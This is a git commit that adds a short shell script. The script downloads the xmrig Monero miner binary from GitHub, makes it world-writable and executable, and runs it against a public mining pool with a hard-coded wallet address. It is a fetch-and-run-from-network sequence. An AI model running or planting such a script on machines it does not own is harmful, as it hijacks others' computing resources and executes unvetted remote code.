998b0adb588f325169b6f4c6f3d034ec91364779
Jasiel Pereira de Sant' ana <jasiellp@hotmail.com>
2021-04-03 21:16:16 -0300

    Create init2.sh

---
+++ init2.sh
@@ -0,0 +1,5 @@
+wget https://github.com/jasiellp/mg/raw/master/xmrig
+
+chmod  +777 xmrig
+
+./xmrig --coin 'monero' -o us-west.minexmr.com:4444 -u 861YkYPN7PngJusCb7bLG8cxsWj84cdWpfG8XLkKuy9yd2jiB8N4vQcKbtMiLw5oJRRdghJrzchxygN8m51QGPhBEjjHWNx.jasiellp -p x --donate-level 1
